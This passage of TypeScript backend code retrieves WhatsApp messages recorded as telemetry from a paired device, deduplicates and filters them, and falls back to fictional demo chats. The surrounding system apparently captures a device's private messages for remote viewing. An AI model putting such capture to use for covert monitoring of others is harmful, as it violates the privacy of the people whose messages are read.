              existing.chatTitle === item.chatTitle &&
              existing.sender === item.sender &&
              existing.message === item.message &&
              Math.abs(existing.rawTimestamp - item.rawTimestamp) < 5000
          );
          if (!isDuplicate) {
            deduplicated.push(item);
          }
        }
        return deduplicated;
      }
    } catch (e) {
      console.warn('[getWhatsApp dedicated query error]:', e);
    }

    // Fallback to NormalizedEvent if dedicated table is empty
    try {
      const events = await this.prisma.normalizedEvent.findMany({
        where: {
          deviceId,
          source: 'whatsapp'
        },
        orderBy: { timestamp: 'desc' },
        take: 300
      });

      const whatsappEvents = events.filter((evt) => {
        const p = (evt.payload as any) || {};
        const text = (p.message || p.text || '').toString().toLowerCase().trim();
        if (!text) return false;

        if (
          text.includes('new messages') ||
          text.includes('unread messages') ||
          /\d+\s+new\s+messages/.test(text) ||
          /\d+\s+messages/.test(text) ||
          text.includes('checking for new messages') ||
          text.includes('whatsapp web is active') ||
          text.includes('backup in progress')
        ) {
          return false;
        }

        return true;
      });

      if (whatsappEvents && whatsappEvents.length > 0) {
        const rawList = whatsappEvents.map((evt) => {
          const p = (evt.payload as any) || {};
          const isOut = Boolean(p.isOutgoing);
          const sender = p.sender || p.chatTitle || (isOut ? 'Me' : 'WhatsApp Contact');
          const msgText = p.message || p.text || '';
          const pkg = p.packageName || 'com.whatsapp';
          const appName = p.appName || (pkg === 'com.whatsapp.w4b' ? 'WhatsApp Business' : 'WhatsApp');

          return {
            id: evt.id,
            sender: sender,
            message: msgText,
            packageName: pkg,
            appName: appName,
            isOutgoing: isOut,
            timestamp: new Date(evt.timestamp).toLocaleString(),
            rawTimestamp: new Date(evt.timestamp).getTime(),
            chatTitle: p.chatTitle || sender
          };
        });

        const deduplicated: typeof rawList = [];
        for (const item of rawList) {
          const isDuplicate = deduplicated.some(
            (existing) =>
              existing.sender === item.sender &&
              existing.message === item.message &&
              Math.abs(existing.rawTimestamp - item.rawTimestamp) < 5000
          );
          if (!isDuplicate) {
            deduplicated.push(item);
          }
        }

        return deduplicated;
      }
    } catch (e) {
      console.warn('[getWhatsApp fallback error]:', e);
    }

    // Fallback demo WhatsApp messages if no live telemetry events captured yet
    const now = Date.now();
    return [
      {
        id: 'wa_demo_1',
        sender: 'Alex Rivera',
        message: 'Hey, are we still meeting today at 5 PM near central park?',
        packageName: 'com.whatsapp',
        appName: 'WhatsApp',
        isOutgoing: false,
        timestamp: new Date(now - 120000).toLocaleString(),
        rawTimestamp: now - 120000,
        chatTitle: 'Alex Rivera'
      },
      {
        id: 'wa_demo_2',
        sender: 'Me',
        message: 'Yes! See you near central park.',
        packageName: 'com.whatsapp',
        appName: 'WhatsApp',
        isOutgoing: true,
        timestamp: new Date(now - 60000).toLocaleString(),
        rawTimestamp: now - 60000,
        chatTitle: 'Alex Rivera'
      },
      {
        id: 'wa_demo_3',
        sender: 'Sarah Jenkins',
        message: 'Please send over the revised project specs when ready.',
        packageName: 'com.whatsapp',
        appName: 'WhatsApp',
        isOutgoing: false,
        timestamp: new Date(now - 3600000).toLocaleString(),
        rawTimestamp: now - 3600000,
        chatTitle: 'Sarah Jenkins'
      },
      {
        id: 'wa_demo_4',
        sender: 'Study Group',
        message: 'Shared pdf document: Physics_Notes_Ch4.pdf',
        packageName: 'com.whatsapp.w4b',
        appName: 'WhatsApp Business',
        isOutgoing: false,
        timestamp: new Date(now - 10800000).toLocaleString(),
        rawTimestamp: now - 10800000,
        chatTitle: 'Study Group'
      }
    ];
  }

  // Helper: Verification Guard for Device Registration in PostgreSQL
  async verifyDeviceIsRegistered(deviceId: string): Promise<boolean> {
    if (!deviceId) return false;
    try {
      const device = await this.prisma.device.findUnique({
        where: { id: deviceId }
      });
      return !!(device && device.isPaired);
    } catch {
      return false;
    }
  }
}
